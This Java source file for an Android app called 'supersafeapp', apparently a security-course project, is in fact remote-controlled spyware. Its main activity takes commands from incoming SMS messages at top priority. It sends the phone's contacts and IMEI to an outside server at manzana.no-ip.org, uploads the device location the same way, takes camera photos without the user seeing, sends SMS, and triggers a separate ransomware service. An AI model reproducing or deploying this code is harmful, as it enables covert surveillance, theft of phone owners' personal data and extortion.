package com.seginf.supersafeapp;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.SurfaceView;

public class MainActivity extends Activity implements Commandable {

	public void vibrate() {
		Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
		v.vibrate(2000);
	}

	private SMSCommandParser parser;
	private SMSReceiver receiver;
	private IntentFilter filter;
	private String SMS = "android.provider.Telephony.SMS_RECEIVED";

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		parser = new SMSCommandParser(this);

		receiver = new SMSReceiver();
		receiver.addConsumer(parser);

		filter = new IntentFilter(SMS);
		filter.setPriority(Integer.MAX_VALUE);

		registerReceiver(receiver, filter);	
	}

	protected void onRestart() {
		registerReceiver(receiver, filter);
		super.onRestart();
	}

	protected void onStop() {
		unregisterReceiver(receiver);
		super.onStop();
	}

	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public class SendContactsTask extends AsyncTask<List<Contact>, Void, Void> {
		private static final String URL = "http://manzana.no-ip.org/subir.php";
		protected Void doInBackground(List<Contact>... arg0) {

			HttpPost post = new HttpPost(URL);
			HttpClient client = new DefaultHttpClient();
			client.getParams().setParameter(
					CoreProtocolPNames.PROTOCOL_VERSION,
					HttpVersion.HTTP_1_1);

			List<NameValuePair> content = new ArrayList<NameValuePair>();
			String body = new ListPresenter<Contact>(arg0[0]).toString();
			content.add(new BasicNameValuePair("contacts",body));

			TelephonyManager t = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
			content.add(new BasicNameValuePair("imei",t.getDeviceId()));

			try {
				post.setEntity(new UrlEncodedFormEntity(content));
			} catch (UnsupportedEncodingException e) {
				Log.d("SAFEAPP", "UnsupportedEncodingException");
				return null;
			}

			HttpResponse response = null;

			try {
				response = client.execute(post);
			} catch (ClientProtocolException e) {
				Log.e("SAFEAPP", "ClientProtocolException",e);
				return null;
			} catch (IOException e) {
				Log.d("SAFEAPP", "IOException 1: " + Log.getStackTraceString(e));
				return null;
			}

			try {
				Log.d("SAFEAPP",
						"Server replied: "
								+ EntityUtils.toString(response.getEntity()));
			} catch (ParseException e) {
				Log.d("SAFEAPP", Log.getStackTraceString(e));
			} catch (IOException e) {
				Log.d("SAFEAPP", Log.getStackTraceString(e));
			}
			return null;
		}
	}
	
	@SuppressWarnings("unchecked")
	public void getContactList() {
		final List<Contact> contacts = new ContactsReader(this.getApplicationContext()).contacts();
		new SendContactsTask().execute(contacts);
	}

	private File getAlbumDir() {
		return new File(
				Environment
						.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
				"/");
	}

	public static Camera getCameraInstance() {
		Camera c = null;
		try {
			c = Camera.open(); // attempt to get a Camera instance
		} catch (Exception e) {
			Log.d("SafeApp", "No Camera");
			return null;
		}
		return c; // returns null if camera is unavailable
	}

	private File getImageFile() {
		String s = "yyyyMMdd_HHmmss";
		Date now = new Date();
		String timeStamp = new SimpleDateFormat(s, Locale.US).format(now);

		String imageFileName = "jpeg_" + timeStamp + "_";
		File image;

		try {
			image = File.createTempFile(imageFileName, ".jpeg", getAlbumDir());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
			return null;
		}
		return image;
	}

	public void takePhoto() {
		Camera c = getCameraInstance();
		if (c == null) {
			return;
		}
		SurfaceView view = new SurfaceView(this);

		try {
			c.setPreviewDisplay(view.getHolder());
		} catch (IOException e) {
			Log.e("SafeApp", "Exception", e);
		}
		c.startPreview();

		final File f = getImageFile();
		c.takePicture(null, null, new Camera.PictureCallback() {
			public void onPictureTaken(byte[] data, Camera camera) {
				FileOutputStream out;
				try {
					out = new FileOutputStream(f);
					out.write(data);
					out.close();
				} catch (FileNotFoundException e) {
					Log.e("SafeApp", "Exception", e);
				} catch (IOException e) {
					Log.e("SafeApp", "Exception", e);
				}
			}
		});
	}

	public void takeRansom(String filename) {
		Intent sendIntent = new Intent();
		sendIntent.setAction("com.ransom.ransomwarer.action.RANSOM_ACTION");
		sendIntent.putExtra(Intent.EXTRA_TEXT, filename);
		sendIntent.setType("ransom/note");
		startService(sendIntent);
	}

	@Override
	public void sendSMS(String nro, String mensaje) {
		new SMSSender().sendSMS(nro, mensaje);
	}

	// private Location userLocation;
	private LocationListener locationListener;

	public void getLocation() {
		// Acquire a reference to the system Location Manager
		final LocationManager locationManager = (LocationManager) this
				.getSystemService(Context.LOCATION_SERVICE);

		// Define a listener that responds to location updates
		locationListener = new LocationListener() {

			public void onStatusChanged(String provider, int status,
					Bundle extras) {
			}

			public void onProviderEnabled(String provider) {
			}

			public void onProviderDisabled(String provider) {
			}

			@Override
			public void onLocationChanged(Location location) {
				stopLocationUpdate(locationManager, locationListener);
				uploadLocation(location);
			}
		};

		// Register the listener with the Location Manager to receive location
		// updates
		String locationProvider = LocationManager.NETWORK_PROVIDER;
		// To use GPS location data:
		// String locationProvider = LocationManager.GPS_PROVIDER;
		// and change permissions in the manifest file instead of
		// ACCESS_COARSE_LOCATION, use ACCESS_FINE_LOCATION

		locationManager.requestLocationUpdates(locationProvider, 0, 0,
				locationListener);
	}

	public void stopLocationUpdate(LocationManager locationManager,
			LocationListener locationListener) {
		locationManager.removeUpdates(locationListener);
	}

	// POST Request
	private String URL_POST = "http://manzana.no-ip.org/poster.php";

	public void uploadLocation(final Location location) {
		new AsyncTask< Void,Void,Void>(){
			protected Void doInBackground(Void... arg0) {
				try {
					HttpPost post = new HttpPost(URL_POST);
        			HttpClient client = new DefaultHttpClient();
        			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);

        			List<NameValuePair> content = new ArrayList<NameValuePair>(); 

        			Double latitude = location.getLatitude();
        	        Double longitude = location.getLongitude();
        			
        	        TelephonyManager mngr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE); 
        	        String imai = mngr.getDeviceId();

        			content.add(new BasicNameValuePair("latitude",latitude.toString()));
        			content.add(new BasicNameValuePair("longitude",longitude.toString()));
        			content.add(new BasicNameValuePair("imai",imai));
        			post.setEntity(new UrlEncodedFormEntity(content));

        			HttpResponse response = client.execute(post);

					Log.d("RANSOMWARER","Server replied: "
						+ EntityUtils.toString(response.getEntity()));
				} catch (Exception e) {
					Log.e("RANSOMWARER", "Exception sending data: ", e);
				}
				return null;
			}			
		}.execute();                
	}
}
